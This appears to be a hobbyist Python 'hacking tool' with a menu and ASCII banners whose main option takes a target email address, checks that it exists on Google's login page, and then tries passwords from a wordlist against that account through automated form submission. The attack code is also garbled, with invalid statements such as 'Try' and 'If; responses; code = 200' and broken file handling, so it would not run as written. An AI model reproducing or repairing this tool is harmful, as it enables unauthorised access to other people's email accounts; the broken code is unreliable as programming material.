import ast
from ast import Try, ExceptHandler , If , Break, excepthandler
from http.client import responses
from ssl import HAS_SSLv2 
import mechanize 
from math import pi
import numbers 
import requests
import fileinput
import datetime
import sys

if sys.version_info[0] !=3:
    print('please install the latest python before running the programme')
    print('pkg install python3')
    sys.exit()
print("""\033[1;32m
  _|_|_|                 _|      _|   _|_|_|_|   _|      _|   _|    _|  
 _|                      _|_|  _|_|   _|         _|_|    _|   _|    _|  
 _|  _|_|   _|_|_|_|_|   _|  _|  _|   _|_|_|     _|  _|  _|   _|    _|  
 _|    _|                _|      _|   _|         _|    _|_|   _|    _|  
   _|_|_|                _|      _|   _|_|_|_|   _|      _|     _|_|    
    \033[1;32m""")
print("""\033[1;33m                                                                        
[*]CODED BY : CYBERNETICS
[*]TEAM : ALONE
[*]WEB TAG : shade234sherif          
[*]NOTICE : MAX VERSION UPDATE: 31st AUGUST 2022                                                             
\033[1;0m""")
print("\033[2;32m..\n.. \033[2;32m")

answer=True
while answer:
    print("[1] START TOOL")
    print("[2] NET CONNECTION TEST")
    print("[3] CONTACT THE DEVELOPER")
    print("[4] EXIT")
    answer=input("OPTION:")
    if answer =="1":
        print('\033[1;36m  ________    ___________________ .____     .___  _______   ________________________________  \033[1;36m')
        print('\033[1;36m /  _____/   /   _____/\______   \|    |    |   | \      \  \__    ___/\_   _____/\______   \ \033[1;36m')
        print('\033[1;36m/   \  ___   \_____  \  |     ___/|    |    |   | /   |   \   |    |    |    __)_  |       _/ \033[1;36m') 
        print('\033[1;36m\    \_\  \  /        \ |    |    |    |___ |   |/    |    \  |    |    |        \ |    |   \ \033[1;36m')
        print('\033[1;36m \______  / /_______  / |____|    |_______ \|___|\____|__  /  |____|   /_______  / |____|_  / \033[1;36m')
        print('\033[1;36m        \/          \/                    \/             \/                    \/         \/  \033[1;00m')


        Break;
        mail = input("Enter target mail address:")

        import mechanize

        web = mechanize.Browser()

        url = "https://accounts.google.com"
        header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
        web.addheaders = [('User-agent',header)]
        web.open(url)
        Try 
        If; responses; code = 200
        web.set_handler_redirect(True)
        web.set_handler_robots(False)
        web.set_handler_gzip(False)
        web.set_handler_redirect(True)



        web.select_form(nr=0)

        web.form['Email or phone'] = mail

        responses = web.submit()
        responses_data = responses.r()

        if "Enter your password" in responses_data:
           print("MAIL ADDRESS FOUND🦉")
        else: 
           print('\033[1;31mMAIL ADDRESS NOT FOUND\033[1;00m') 

        file=open('pass.txt','r')

        i=0
        while file:
                file=open('pass.txt','o','r')
                i=+1
                if len(file) < 11:
                       continue
                print(" Trying ",file+"")
    

        Try
        web.select_form(nr=0)

        web.form['Enter your password']= file
        responses = web.submit()
        responses_data = responses.r()
        'Add a home address' in responses_data or 'Add or confirm your recovery mail or phone number' in responses_data;
        print("your password is: ",file)
        sys.exit()

    elif answer=="2":
        import mechanize
        test = mechanize.Browser()
        ourl='https://github.com/shade234sherif'
        header='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'
        test.open(ourl)
        Try
        If; responses; code=200
        print('NETWORK CONNECTION IS GOOD - TIME CAPTURED')
        now = datetime.datetime.now()
        print(now.strftime('%y-%m-%d %H : %M : %S'))

    elif answer=="3": 
        print('\033[1;33mCONTACT THE DEVELOPER USING THE SOCIAL LINKS PROVIDED BELOW\033[1;32m')
        print('FACEBOOK PAGE: https://facebook.com/cyberhacks6')
        print("")
        print('FACEBOOK MAIN ACC : https://facebook.com/shade234sherif')
        print("")
        print('GITHUB: https://github.com/shade234sherif')
        print("")
        print("WHATSAPP : +234 9155558315")
        print("")

    elif answer=="4":
        print("HAPPY HACKING")
        print("FOLLOW ME ON GITHUB FOR MORE : https://github.com/shade234sherif\n BYE")
        break

    elif answer!="":
        Break
        print("\033[2;31mINVALID OPTION PROVIDED\n TRY AGAIN\033[2;32m")
        
